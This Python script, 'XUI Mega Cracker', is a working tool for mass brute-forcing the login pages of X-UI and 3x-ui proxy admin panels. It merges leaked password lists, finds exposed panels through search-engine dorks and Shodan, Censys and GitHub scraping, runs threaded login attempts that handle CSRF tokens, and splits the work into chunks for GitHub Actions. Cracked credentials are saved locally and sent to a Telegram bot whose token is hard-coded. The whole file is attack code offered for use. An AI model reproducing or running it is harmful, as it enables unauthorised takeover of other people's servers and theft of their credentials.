import requests
import threading
import sys
import json
import re
import time
import os
from urllib.parse import urljoin, urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import hashlib

# ========== تنظیمات ==========
VERSION = "MEGA_V2.0"
AUTHOR = "@jasonmodding"
DELAY = 0.15
REFRESH_RATE = 0.3
MAX_WORKERS_PER_CHUNK = 30
TELEGRAM_BOT_TOKEN = "8608061868:AAHEEsZPOw8vq100WyyusF3QjTlBvTq9-Iw"
TELEGRAM_CHAT_ID = "7963634461"

# ========== رنگ‌ها ==========
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'
    END = '\033[0m'

# ========== بنر ==========
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.CYAN}   ███╗   ███╗███████╗ ██████╗  █████╗              {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ████╗ ████║██╔════╝██╔════╝ ██╔══██╗             {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ██╔████╔██║█████╗  ██║  ███╗███████║             {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║             {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║             {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝             {Colors.RED}║
{Colors.RED}╠══════════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.GREEN}         XUI MEGA CRACKER {VERSION} - {AUTHOR}        {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}         [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]                                {Colors.RED}║
{Colors.RED}╚══════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

# ========== تلگرام ==========
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000]}, timeout=5)
    except:
        pass

# ========== دانلود و ادغام ۱۰ سورس عظیم ==========
MEGA_SOURCES = {
    "passwords": [
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-common-passwords.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/MySpace.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/Facebook.txt",
        "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt",
        "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top1575-probable-v2.txt",
    ],
    "usernames": [
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-500.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt",
    ]
}

def fetch_massive_wordlists():
    os.makedirs("wordlists", exist_ok=True)
    all_passwords = set()
    all_usernames = set()
    for url in MEGA_SOURCES["passwords"]:
        try:
            r = requests.get(url, timeout=20)
            lines = r.text.splitlines()
            all_passwords.update([l.strip() for l in lines if l.strip()])
        except:
            pass
    for url in MEGA_SOURCES["usernames"]:
        try:
            r = requests.get(url, timeout=20)
            lines = r.text.splitlines()
            all_usernames.update([l.strip() for l in lines if l.strip()])
        except:
            pass
    # اضافه کردن پیشفرض‌های X-UI
    default_creds = ["admin", "root", "user", "test", "support", "admin123", "123456", "password"]
    all_usernames.update(default_creds)
    all_passwords.update(default_creds)
    with open("wordlists/passwords.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(all_passwords))
    with open("wordlists/usernames.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(all_usernames))
    send_telegram(f"📦 Wordlists ready: {len(all_passwords)} passwords, {len(all_usernames)} usernames")
    return len(all_passwords), len(all_usernames)

# ========== دریافت آیپی زنده بدون کلید ==========
def extract_ip_from_url(url):
    parsed = urlparse(url)
    host = parsed.hostname
    if host:
        # ساده: بررسی اینکه آیپی باشد
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
            return host
    return None

def is_xui_alive(ip, port=443):
    try:
        for proto in ["https", "http"]:
            r = requests.get(f"{proto}://{ip}:{port}/", timeout=3, verify=False)
            if r.status_code < 500:
                if "X-UI" in r.text or "3x-ui" in r.text or "xray" in r.text.lower():
                    return True
        return False
    except:
        return False

def fetch_live_ips():
    ips = set()
    # 1. Google Dorking (بدون کلید)
    try:
        from googlesearch import search
        for query in ['intitle:"X-UI" inurl:login', '"3x-ui" "panel"', '"X-UI Panel" "login"']:
            for url in search(query, num_results=30, stop=30):
                ip = extract_ip_from_url(url)
                if ip and is_xui_alive(ip):
                    ips.add(ip)
    except:
        pass
    # 2. OpenProxyList
    try:
        r = requests.get("https://api.openproxylist.xyz/http.txt", timeout=10)
        for line in r.text.splitlines():
            if ":" in line:
                ip = line.split(":")[0]
                if is_xui_alive(ip):
                    ips.add(ip)
    except:
        pass
    # 3. Censys public (بدون احراز)
    try:
        r = requests.get("https://search.censys.io/api/v1/search/hosts?q=3x-ui&per_page=50", timeout=10)
        if r.status_code == 200:
            for host in r.json().get("results", []):
                ip = host.get("ip")
                if ip and is_xui_alive(ip):
                    ips.add(ip)
    except:
        pass
    # 4. Shodan (بدون کلید - فقط صفحه HTML)
    try:
        r = requests.get("https://www.shodan.io/search/facet?query=3x-ui", timeout=10)
        matches = re.findall(r'(\d+\.\d+\.\d+\.\d+):\d+', r.text)
        for ip in matches:
            if is_xui_alive(ip):
                ips.add(ip)
    except:
        pass
    # 5. GitHub search (جستجوی فایل‌های کانفیگ)
    try:
        r = requests.get("https://api.github.com/search/code?q=X-UI+config.json", timeout=10)
        if r.status_code == 200:
            for item in r.json().get("items", []):
                raw_url = item.get("html_url", "").replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
                try:
                    raw = requests.get(raw_url, timeout=5)
                    for line in raw.text.splitlines():
                        if "://" in line:
                            ip = extract_ip_from_url(line)
                            if ip and is_xui_alive(ip):
                                ips.add(ip)
                except:
                    pass
    except:
        pass
    # ذخیره
    with open("ips.txt", "w") as f:
        for ip in ips:
            f.write(ip + "\n")
    send_telegram(f"🌐 Found {len(ips)} live X-UI IPs")
    return list(ips)

# ========== توابع هسته کرک ==========
def get_csrf_and_cookies(target_url, manual_cookie=None):
    session = requests.Session()
    if manual_cookie:
        session.cookies.set("3x-ui", manual_cookie)
    try:
        response = session.get(target_url + "/", timeout=5)
        if response.status_code == 200:
            csrf_token = None
            patterns = [
                r'name="csrf_token"\s+value="([^"]+)"',
                r'csrf-token\s*:\s*"([^"]+)"',
                r'x-csrf-token\s*:\s*"([^"]+)"',
                r'<meta[^>]+csrf-token[^>]+content="([^"]+)"',
                r'var\s+csrf_token\s*=\s*"([^"]+)"'
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    csrf_token = match.group(1)
                    break
            if not csrf_token and 'x-csrf-token' in response.headers:
                csrf_token = response.headers['x-csrf-token']
            return session, csrf_token
        return session, None
    except:
        return session, None

def check_login(target_url, username, password, session, csrf_token):
    login_url = urljoin(target_url, "/login")
    payload = {"username": username, "password": password, "twoFactorCode": ""}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": target_url,
        "Referer": target_url + "/login",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }
    if csrf_token:
        headers["x-csrf-token"] = csrf_token
    try:
        response = session.post(login_url, data=payload, headers=headers, timeout=5)
        if response.status_code in [503, 403]:
            return False, None
        try:
            json_resp = response.json()
            if json_resp.get("success") == True:
                return True, f"{username}:{password}"
            return False, None
        except:
            if "dashboard" in response.text.lower() or "panel" in response.text.lower():
                return True, f"{username}:{password}"
            return False, None
    except:
        return False, None

# ========== کارگر ==========
def worker(target_url, username_chunk, passwords, session, csrf_token, results, stats, stop_event, target_status):
    for user in username_chunk:
        if stop_event.is_set():
            break
        for pwd in passwords:
            if stop_event.is_set():
                break
            stats['total'] += 1
            success, credential = check_login(target_url, user, pwd, session, csrf_token)
            if success:
                results.append(credential)
                stats['found'] += 1
                target_status['status'] = 'good'
                with open("good.txt", "a", encoding="utf-8") as f:
                    f.write(f"{target_url} | {credential} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                send_telegram(f"✅ Found: {credential} on {target_url}")
                return
            time.sleep(DELAY)
    if target_status['status'] == 'unknown':
        target_status['status'] = 'failed'
        stats['failed'] += 1

def crack_target(target_url, usernames, passwords, thread_count=30):
    session, csrf = get_csrf_and_cookies(target_url)
    if not csrf:
        return {'bad': 1}
    target_status = {'status': 'unknown'}
    stats = {'total': 0, 'found': 0, 'failed': 0}
    results = []
    stop_event = threading.Event()
    chunk_size = max(1, len(usernames) // thread_count)
    threads = []
    for i in range(thread_count):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i < thread_count - 1 else len(usernames)
        chunk = usernames[start:end]
        if chunk:
            new_session, new_csrf = get_csrf_and_cookies(target_url)
            if not new_csrf:
                new_csrf = csrf
            t = threading.Thread(target=worker, args=(
                target_url, chunk, passwords, new_session, new_csrf, results, stats, stop_event, target_status
            ))
            threads.append(t)
            t.start()
    for t in threads:
        t.join()
    return stats

# ========== اجرای اصلی ==========
def main():
    parser = argparse.ArgumentParser(description="XUI Mega Cracker")
    parser.add_argument("--fetch-wordlists", action="store_true", help="Download & merge 10 massive wordlists")
    parser.add_argument("--fetch-ips", action="store_true", help="Find live X-UI IPs without API keys")
    parser.add_argument("--target", help="Single target IP:PORT")
    parser.add_argument("--threads", type=int, default=30, help="Threads per target")
    parser.add_argument("--chunk", type=int, help="Chunk ID (for GitHub Actions matrix)")
    parser.add_argument("--total-chunks", type=int, default=20, help="Total chunks")
    args = parser.parse_args()

    if args.fetch_wordlists:
        fetch_massive_wordlists()
        return

    if args.fetch_ips:
        fetch_live_ips()
        return

    # حالت کرک
    if not os.path.exists("wordlists/passwords.txt") or not os.path.exists("wordlists/usernames.txt"):
        print("[!] Wordlists not found. Run with --fetch-wordlists first.")
        send_telegram("❌ Wordlists missing, run fetch-wordlists")
        sys.exit(1)

    with open("wordlists/passwords.txt", "r", encoding="utf-8", errors="ignore") as f:
        all_passwords = [l.strip() for l in f if l.strip()]
    with open("wordlists/usernames.txt", "r", encoding="utf-8", errors="ignore") as f:
        all_usernames = [l.strip() for l in f if l.strip()]

    if args.chunk and args.total_chunks:
        # حالت ماتریسی (اکشنز)
        chunk_size = max(1, len(all_passwords) // args.total_chunks)
        start = (args.chunk - 1) * chunk_size
        end = start + chunk_size if args.chunk < args.total_chunks else len(all_passwords)
        passwords = all_passwords[start:end]
    else:
        passwords = all_passwords

    if args.target:
        targets = [args.target]
    else:
        if not os.path.exists("ips.txt"):
            print("[!] No ips.txt and no target specified. Use --fetch-ips or provide --target")
            sys.exit(1)
        with open("ips.txt", "r") as f:
            targets = [l.strip() for l in f if l.strip()]

    send_telegram(f"🚀 Starting crack on {len(targets)} targets, {len(passwords)} passwords, {len(all_usernames)} users")

    for target in targets:
        if not target.startswith("http"):
            target = "http://" + target
        target = target.rstrip("/")
        stats = crack_target(target, all_usernames, passwords, args.threads)
        if stats.get('found', 0) > 0:
            send_telegram(f"🎯 {target} - Found {stats['found']} credentials!")

    print("[+] Done. Check good.txt for results.")
    send_telegram("✅ All targets processed.")

if __name__ == "__main__":
    main()
